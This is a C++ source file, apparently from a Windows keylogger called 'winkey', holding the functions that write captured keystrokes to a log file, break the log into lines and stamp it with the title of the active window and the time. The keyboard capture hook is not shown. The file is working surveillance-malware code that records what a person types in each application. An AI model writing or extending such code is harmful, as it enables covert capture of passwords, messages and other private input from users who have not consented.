#include "winkey.hpp"

void log_keystroke(std::string key_name) {

	// Variable to track the number of keys appended on the current line
	// This is to avoid having infinite line
	static int nb_keys_on_line = 0;

	// Write the pressed key to the log file
	g_log_file << key_name;
	nb_keys_on_line++;

	// We don't still don't want infinite lines
	if (nb_keys_on_line > 10) {
		g_log_file << std::endl;
		nb_keys_on_line = 0;
	}
}

void log_window_title(std::string window_title) {
	g_log_file << std::endl;
	g_log_file << "{{{ " << get_current_timestamp() << " ||| " << window_title << " }}}" << std::endl;
}

int open_log_file() {
	// Open the log file in append mode
	g_log_file.open(LOG_FILE, std::ios::out | std::ios::app);

	if (g_log_file.is_open()) {
		std::cout << "Log file opened." << std::endl;
		return 1;
	}
	std::cerr << "Failed to open the log file." << std::endl;
	return 0;
}

std::string get_current_timestamp() {
	// Get the current time point using the system_clock
	auto current_time_point = std::chrono::system_clock::now();

	// Convert the time point to a time_t value
	auto current_time = std::chrono::system_clock::to_time_t(current_time_point);

	// Convert the time_t value to a tm structure representing local time using localtime_s
	std::tm local_time_info;
	localtime_s(&local_time_info, &current_time);

	// Format and print the current time
	char time_buffer[20];
	std::strftime(time_buffer, sizeof(time_buffer), "%Y-%m-%d %H:%M:%S", &local_time_info);

	return time_buffer;
}
